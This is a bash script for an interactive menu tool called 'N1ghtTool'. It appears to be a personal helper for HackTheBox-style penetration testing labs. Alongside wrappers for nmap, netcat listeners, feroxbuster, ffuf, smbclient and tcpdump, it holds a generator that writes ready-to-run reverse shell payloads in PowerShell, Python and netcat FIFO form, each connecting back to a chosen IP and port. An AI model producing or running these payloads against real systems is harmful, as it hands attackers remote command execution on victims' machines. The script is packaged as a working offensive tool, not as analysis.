#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
RESET='\033[0m'

# set up nc listener
setup_listener() {
    read -p "Enter the port for netcat listener: " port
    echo -e "${CYAN}Setting up netcat listener on port $port...${RESET}"
    nc -lvnp $port
}

# set up nmap scan
nmap_scan() {
    read -p "Enter the target IP address: " target_ip
    echo -e "${CYAN}Performing nmap scan on $target_ip...${RESET}"
    nmap -sC -sV -oN nmap_scan_$target_ip.txt $target_ip
    echo -e "${GREEN}Nmap scan completed. Results saved to nmap_scan_$target_ip.txt${RESET}"
}

# set up wget
download_file_wget() {
    read -p "Enter the URL to download: " url
    echo -e "${CYAN}Downloading $url using wget...${RESET}"
    wget $url
    echo -e "${GREEN}Download completed.${RESET}"
}

# set up curl
download_file_curl() {
    read -p "Enter the URL to download: " url
    echo -e "${CYAN}Downloading $url using curl...${RESET}"
    curl -O $url
    echo -e "${GREEN}Download completed.${RESET}"
}

# set up /etc/hosts
add_to_hosts_file() {
    read -p "Enter the target IP address: " target_ip
    read -p "Enter the domain name (e.g., agile.htb): " domain_name

    if ! grep -q "$target_ip $domain_name" /etc/hosts; then
        echo "$target_ip $domain_name" | sudo tee -a /etc/hosts > /dev/null
        echo -e "${GREEN}Added $target_ip $domain_name to /etc/hosts.${RESET}"
    else
        echo -e "${YELLOW}Entry already exists in /etc/hosts.${RESET}"
    fi
}

# set python server
setup_http_server() {
    read -p "Enter the port for HTTP server: " port
    echo -e "${CYAN}Setting up HTTP server on port $port...${RESET}"
    python3 -m http.server $port
}

# create shells
create_reverse_shell() {
    echo -e "${BLUE}Select the type of reverse shell:${RESET}"
    echo "1. PowerShell TCP reverse shell"
    echo "2. Python reverse shell"
    echo "3. Netcat FIFO reverse shell"
    read -p "Enter your choice (1-3): " shell_choice

    read -p "Enter the IP address: " target_ip
    read -p "Enter port: " port

    case $shell_choice in
        1)
            payload="\$LHOST = \"$target_ip\"; \$LPORT = $port; \$TCPClient = New-Object Net.Sockets.TCPClient(\$LHOST, \$LPORT); \$NetworkStream = \$TCPClient.GetStream(); \$StreamReader = New-Object IO.StreamReader(\$NetworkStream); \$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream); \$StreamWriter.AutoFlush = \$true; \$Buffer = New-Object System.Byte[] 1024; while (\$TCPClient.Connected) { while (\$NetworkStream.DataAvailable) { \$RawData = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length); \$Code = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$RawData -1) }; if (\$TCPClient.Connected -and \$Code.Length -gt 1) { \$Output = try { Invoke-Expression (\$Code) 2>&1 } catch { \$_ }; \$StreamWriter.Write(\"\$Output\`n\"); \$Code = \$null } }; \$TCPClient.Close(); \$NetworkStream.Close(); \$StreamReader.Close(); \$StreamWriter.Close()"
            echo -e "${CYAN}Creating PowerShell TCP reverse shell payload...${RESET}"
            echo $payload > reverse_shell.ps1
            echo -e "${GREEN}Reverse shell payload created and saved to reverse_shell.ps1${RESET}"
            ;;
        2)
            payload="import sys,socket,os,pty; s=socket.socket(); s.connect((\"$target_ip\",$port)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")"
            echo -e "${CYAN}Creating Python reverse shell payload...${RESET}"
            echo $payload > reverse_shell.py
            echo -e "${GREEN}Reverse shell payload created and saved to reverse_shell.py${RESET}"
            ;;
        3)
            payload="rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $target_ip $port >/tmp/f"
            echo -e "${CYAN}Creating Netcat FIFO reverse shell payload...${RESET}"
            echo $payload > reverse_shell.sh
            chmod +x reverse_shell.sh
            echo -e "${GREEN}Reverse shell payload created and saved to reverse_shell.sh${RESET}"
            ;;
        *)
            echo -e "${RED}Invalid choice. Exiting...${RESET}"
            ;;
    esac
}

#set up feroxbuster
dir_scan() {
    read -p "Enter the target URL: " url
    read -p "Enter Wordlist: " wordlist
    read -p "Entr name to save response: " file_name
    echo -e "${CYAN}Performing directory brute force attack on $url...${RESET}"
    feroxbuster -u $url -w $wordlist -o $file_name
    echo -e "${GREEN}Feroxbuster scan completed.${RESET}"
}

#set up smb
enumerate_smb() {
    read -p "Enter the target IP address: " target_ip
    echo -e "${CYAN}Enumerating SMB shares on $target_ip...${RESET}"
    smbclient -L \\\\$target_ip\\
    echo -e "${GREEN}SMB enumeration completed.${RESET}"
}

#set up tcpdump
tcpdump_scan() {
    read -p "Enter Interface: " interface
    echo -e "${CYAN}Listening on $interface...${RESET}"
    sudo tcpdump -i $interface icmp
    echo -e "${GREEN}tcpdump completed.${RESET}"
}

# sumbdomain fuzz
ffuf_scan() {
   read -p "Enter url: " url
   read -p "Enter Domain: " domain
   read -p "Enter Wordlist: " wordlist
   read -p "Enter responses to filter out: " filter
   read -p "Enter name to save output: " outfile
   echo -e "${RED}Running FFUF...${RESET}"
   ffuf -u $url -H "HOST:FUZZ.$domain" -w $wordlist -fc $filter -o $outfile
   echo -e "${GREEN}Scan completed${RESET}"
 }
 

while true; do
    echo -e "${GREEN}==========================${RESET}"
    echo -e "${WHITE}     N1ghtTool            ${RESET}"
    echo -e "${GREEN}==========================${RESET}"
    echo -e "${WHITE}1. Set up netcat listener${RESET}"
    echo -e "${WHITE}2. Perform nmap scan${RESET}"
    echo -e "${WHITE}3. Download file using wget${RESET}"
    echo -e "${WHITE}4. Download file using curl${RESET}"
    echo -e "${WHITE}5. Add target IP to /etc/hosts${RESET}"
    echo -e "${WHITE}6. Set up HTTP server${RESET}"
    echo -e "${WHITE}7. Create reverse shell payload${RESET}"
    echo -e "${WHITE}8. Perform directory brute force attack${RESET}"
    echo -e "${WHITE}9. Enumerate SMB shares${RESET}"
    echo -e "${WHITE}10. TcpDump${RESET}"
    echo -e "${WHITE}11. FFuf${RESET}"
    echo -e "${WHITE}12. Exit${RESET}"
    echo -e "${GREEN}==========================${RESET}"
    read -p "Choose an option (1-12): " choice

    case $choice in
        1) setup_listener ;;
        2) nmap_scan ;;
        3) download_file_wget ;;
        4) download_file_curl ;;
        5) add_to_hosts_file ;;
        6) setup_http_server ;;
        7) create_reverse_shell ;;
        8) dir_scan ;;
        9) enumerate_smb ;;
        10) tcpdump_scan ;;
        11) ffuf_scan ;;
        12) echo -e "${GREEN}Exiting...${RESET}"; break ;;
        *) echo -e "${RED}Invalid option, please choose again.${RESET}" ;;
    esac
done
